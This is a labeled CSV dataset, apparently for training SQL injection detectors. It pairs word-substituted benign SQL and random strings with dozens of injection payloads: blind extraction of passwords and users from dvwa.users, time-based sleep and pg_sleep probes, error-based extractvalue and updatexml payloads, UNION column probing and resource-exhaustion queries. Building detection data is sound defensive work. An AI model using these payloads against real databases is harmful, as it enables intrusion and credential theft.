Query,SQLIA
"   SELECT Employees.guess, COUNT ( Orders.wishID )  AS moreFROM    ( OrdersINNER JOIN lesson ON Orders.carriedID  =  Employees.effectID ) ",False
"1'   )    )    as omwk where 1414  =  1414 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",True
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,False
c/ txapin ene 162,False
"SELECT CustomerName, ContactName FROM Customers WHERE  Country  =  ""Brazil"";",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),27,1))>96 AND 'TszS'='TszS",True
" select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",True
SELECT DISTINCT history FROM history,False
-3573) AS iAsF WHERE 8699=8699 OR 4072=4072-- peuT,True
select   (  case when   (  5142  =  6855  )   then 5142 else 5142*  (  select 5142 from mysql.db  )   end  )  #,True
54011879j,False
" select * from users where id  =  1 or @#""{  =  1 or 1  =  1 -- 1",True
SELECT * FROM heavy FETCH FIRST 50 PERCENT ROWS ONLY,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),16,1))>49 AND 'uBuU'='uBuU",True
ae57f5r4,False
mula,False
trixy,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 1,1),10,1))>100 AND 'KwMp'='KwMp",True
barceo,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),17,1))>58 AND 'bSNt'='bSNt",True
aventino,False
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367533 ) ,False
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""suxh""  =  ""suxh",True
40592671v,False
-2452'   )    )     )   union all select 1951--,True
"  SELECT trap,problem FROM high WHERE tie = 'danger' UNION SELECT attempt, inside FROM hunter",False
"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",True
SELECT * FROM together WHERE birthday IN  ( SELECT location FROM entire ) ,False
"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,True
select   (  case when   (  5390  =  7419  )   then 5390 else 5390*  (  select 5390 from mysql.db  )   end  )  #,True
FROM  ( SELECT DISTINCT airplane FROM flow ) ,False
"INSERT INTO my ( beneath, clock, worth, cannot, how, bear )  VALUES  ( 'flame', 'knew'. save', 'opinion', 'smoke', 'satisfied', 'model' )  ",False
"INSERT INTO unless ( by, chair, letter, porch, came, ready )  VALUES  ( 'lost', 'cause'. happy', 'swung', 'detail', 'being', 'needed' )  ",False
" SELECT * FROM mouth ORDER BY wish, north",False
"1%'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",True
SELECT MIN ( just )  AS second FROM solar,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761 LIMIT 1,1),6,1))>108 AND 'bccT'='bccT",True
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_content' LIMIT 1,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),10,1))>54 AND 'Tfyt'='Tfyt",True
"  SELECT TIME_TO_SEC ( ""19:30:10"" ) ;",False
" SELECT column_name ( s )  FROM curious,bus",False
cojera,False
SELECT * FROM birthday WHERE continued = 'slowly' FETCH FIRST 3 ROWS ONLY,False
lubna,False
"INSERT INTO harbor  ( worth, bone, married )  VALUES  ( 'basic', 'negative', 'spell' )  ",False
1 AND 9820=9820-- DwMv,True
"  SELECT soundID AS ID, blue AS view FROM information",False
"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",True
huaranga chicon,False
SELECT TOP 3 * FROM lying WHERE straw = 'decide',False
65651817l,False
SELECT chemical ( s )  FROM coat UNION,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),26,1))>54 AND 'JUqW'='JUqW",True
"1"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""bnyh""  =  ""bnyh",True
"1%""   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",True
12489,False
"SELECT MONTHNAME ( ""2017-06-15 09:34:21"" ) ;",False
tiberio,False
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,True
jiinshuh,False
select case when 5894  =  4052 then 1 else null end--,True
SELECT * FROM collect,False
"buidaoli, 49, 12-g",False
"   SELECT Employees.mistake, COUNT ( Orders.worseID )  AS oughtFROM    ( OrdersINNER JOIN storm ON Orders.diameterID  =  Employees.bothID ) ",False
"  UPDATE bean SET well =  'replied', City =  'gain' WHERE mathematics =  twice",False
SELECT * FROM tube WHERE hollow BETWEEN '1996-07-01' AND '1996-07-31',False
"  SELECT introduced,pure FROM teacher WHERE describe = 'century' UNION SELECT roll, seat FROM possible",False
"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",True
1.38067E+15,False
SELECT TOP 3 * FROM chart WHERE can = 'west',False
"INSERT INTO smaller ( zebra, afraid, fed, noted, condition, merely )  VALUES  ( 'low', 'spell'. store', 'spread', 'sent', 'instance', 'shallow' )  ",False
levert,False
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'bwrb' like 'bwrb",True
07375030b,False
"1' in boolean mode  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",True
" select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",True
shorwan,False
trincha-32r1,False
SELECT edge ( s )  FROM tree FULL OUTER JOIN,False
SELECT * FROM die WHERE ball = 'edge',False
SELECT * FROM policeman FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM half,False
" SELECT CONCAT ( Address, "" "", PostalCode, "" "", City )  AS Address FROM  Customers;",False
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'yabn'  =  'yabn",True
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'hzav'  =  'hzav",True
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",True
gusta mont,False
SELECT * FROM pretty,False
"INSERT INTO whole  ( sudden, of, master )  VALUES  ( 'rule', 'largest', 'bread' )  ",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),9,1))>102 AND 'Tfyt'='Tfyt",True
arabele,False
"1%""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",True
SELECT lack,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 0,1),5,1))>84 AND 'DYEw'='DYEw",True
1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,True
"1%'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  '%'  =  '",True
"1' where 8969  =  8969 union all select null,null,null,null,null--",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),14,1))>87 AND 'uBuU'='uBuU",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),13,1))>108 AND 'epJT'='epJT",True
"cuesta de la baronesa, 192",False
"1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '",True
mendiz espn,False
select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #,True
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   '%'  =  ',True
SELECT TOP 3 * FROM truth,False
pawley@santacruzdelvoto.vu,False
1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ) ,True
-1117 OR 4072=4072# LRDc,True
" end and    (    (     (  ""zpii"" like ""zpii",True
SELECT * FROM final WHERE bicycle = 'brief',False
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",True
SELECT saddle ( s )  FROM key SELECT there FROM paragraph,False
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",True
"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",True
1'   )    )     )   and 5615  =  5458--,True
SELECT * FROM doubt WHERE shoe IN  ( SELECT information FROM position ) ,False
"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",True
SELECT * FROM horse WHERE NOT piano = 'highway'  AND NOT shop = 'dance',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),7,1))>64 AND 'hBNb'='hBNb",True
"plza. leire, 1, 6?a",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),4,1))>67 AND 'bSNt'='bSNt",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),2,1))>111 AND 'LpdU'='LpdU",True
"   SELECT Employees.oldest, COUNT ( Orders.wholeID )  AS raceFROM    ( OrdersINNER JOIN close ON Orders.chanceID  =  Employees.scaleID ) ",False
"1   )    )    as rpwt where 4103  =  4103 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",True
SELECT * FROM travel WHERE claws NOT LIKE 'escape%',False
galdo palacn,False
"-2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746#",True
4451,False
cmitre,False
25727,False
1  )   where 7159  =  7159,True
FROM  ( SELECT DISTINCT choice FROM event ) ,False
-4617'   )    )     )   or 9323  =  9323#,True
-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',True
molet,False
1' and 2316  =  7236,True
aminda,False
SELECT * FROM [Brazil Customers]; CREATE VIEW [Products Above Average Price] AS,False
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",True
8.88987E+15,False
darcange1,False
"1%'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",True
"1""   )    )    as dvpb where 6673  =  6673",True
-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(last_login AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),10,1))>57 AND 'bSNt'='bSNt",True
larreynaga arce,False
"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",True
SELECT MIN ( wood )  AS union FROM disease,False
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym",True
"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",True
SELECT * FROM age FETCH FIRST 50 PERCENT ROWS ONLY,False
"1""  )   and   (  4085  =  4885  )  *4885 and   (  ""sxte""  =  ""sxte",True
hoyt,False
"1""  )   as wjdc where 8694  =  8694 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",True
SELECT * FROM wing WHERE sound = 'depth'  OR body = 'raw',False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(`user` AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 4,1),6,1))>124 AND 'yIOe'='yIOe",True
"   SELECT Employees.adjective, COUNT ( Orders.oceanID )  AS guessFROM    ( OrdersINNER JOIN join ON Orders.deathID  =  Employees.snowID ) ",False
"   SELECT individual, decide, milkFROM deeply WHERE citizen  IS NOT NULL",False
ferreruela,False
hinojal,False
" SELECT column_name ( s )  FROM circus,western",False
96to3a38,False
SELECT extra ( s )  FROM have UNION ALL,False
"  SELECT partly,roll FROM government WHERE thing = 'five' UNION SELECT help, doing FROM farmer",False
SELECT TOP 3 * FROM belong WHERE old = 'closer' SELECT * FROM him,False
SELECT * FROM Customers WHERE Country = 'Germany' LIMIT 3;,False
"1%""   )    )     )  ",True
SELECT * FROM storm WHERE teach BETWEEN '1996-07-01' AND '1996-07-31',False
sant celoni,False
"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",True
SELECT personal ( s )  FROM single LEFT JOIN,False
1i515s7d7d,False
maiga,False
04607227m,False
"1"")) AND 9820=9820 AND ((""pIbP""=""pIbP",True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),31,1))>1 AND 'IlVZ'='IlVZ",True
3.11985E+15,False
"1%'   )    )     )   union all select null,null,null,null--",True
SELECT * FROM dig WHERE proud BETWEEN '1996-07-01' AND '1996-07-31',False
"calle licurgo, 39",False
SELECT * FROM every WHERE crew BETWEEN '1996-07-01' AND '1996-07-31',False
suzuki,False
correccionalmente,False
29540,False
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  # huhw",True
maycel,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 2,1),29,1))>42 AND 'TszS'='TszS",True
"   SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country    AS Address  FROM Customers;",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),6,1))>48 AND 'IlVZ'='IlVZ",True
SELECT * FROM in WHERE another BETWEEN '1996-07-01' AND '1996-07-31',False
" SELECT * FROM change ORDER BY labor ASC, especially DESC",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),29,1))>49 AND 'upay'='upay",True
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLY,False
"1""  )   union all select null,null,null#",True
grajear,False
admin' or '1'  =  '1'/*,True
"  SELECT suitID AS ID, nervous AS store FROM crop",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 3,1),32,1))>48 AND 'Tfyt'='Tfyt",True
"plza. gazteluzarra, 105 7?b",False
SELECT AVG ( hardly ) FROM by,False
"cantallops, 138,",False
"c/ zamora, 151, 1-b",False
SELECT * FROM adult WHERE saved = 'ten' FETCH FIRST 3 ROWS ONLY,False
SELECT COUNT ( spite )  FROM kids,False
SELECT * FROM did WHERE wood BETWEEN west09/01/1996stomach AND doing15/31/1996manner,False
valle de yerri/deierri,False
4.22605E+15,False
"  SELECT * FROM scared WHERE hunter IN  ( 'dress', 'birds', 'loose' )  ",False
thieu,False
"1 where 4468  =  4468 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",True
" SELECT * FROM judge ORDER BY means, flow",False
SELECT * FROM person ORDER BY necessary DESC,False
l16o2o,False
SELECT * FROM myself WHERE involved BETWEEN 'similar' AND 'luck',False
flo3a,False
1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,True
farmacoplica,False
1   )    )    as vmwj where 5597  =  5597,True
1'   )    )    and 4650  =  1322#,True
"-4135""  )   as leiz where 3582  =  3582 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",True
ulc0r81a,False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(password AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 0,1),29,1))>87 AND 'upay'='upay",True
amenta,False
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   --",True
1 where 2956  =  2956,True
SELECT * FROM length WHERE sent = 'ten',False
SELECT * FROM birthday 3 SELECT * FROM impossible,False
thorpe,False
19392,False
"calle rio piguea, 5,",False
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(avatar AS NCHAR),0x20) FROM dvwa.users ORDER BY `user` LIMIT 1,1),3,1))>84 AND 'IlVZ'='IlVZ",True
1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,True
"1' OR NOT ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761 LIMIT 7,1),7,1))>93 AND 'BDsk'='BDsk",True
FROM  ( SELECT DISTINCT soldier FROM mail ) ,False
"  SELECT Orders.nearlyrID, Employees.suppose, Employees.balance FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.provideID ORDER BY Orders.tapeID",False
1  )   where 9167  =  9167,True
36574,False
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""lxfm""  =  ""lxfm",True
